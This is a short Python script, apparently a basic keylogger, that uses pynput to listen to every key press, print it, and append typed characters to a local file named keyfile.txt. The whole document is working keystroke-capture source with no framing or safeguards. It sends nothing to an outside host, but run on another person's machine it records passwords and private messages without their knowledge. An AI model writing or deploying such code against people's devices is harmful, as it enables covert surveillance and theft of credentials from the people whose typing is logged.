from pynput import keyboard

def keylogged(key):
     print(str(key))
     with open("keyfile.txt",'a') as logKey:
        try :
            char = key.char
            logKey.write(char)
        except:
            print("error")
if __name__ == "__main__"  :
      Listener = keyboard.Listener(on_press=keylogged)
      Listener.start()
      input()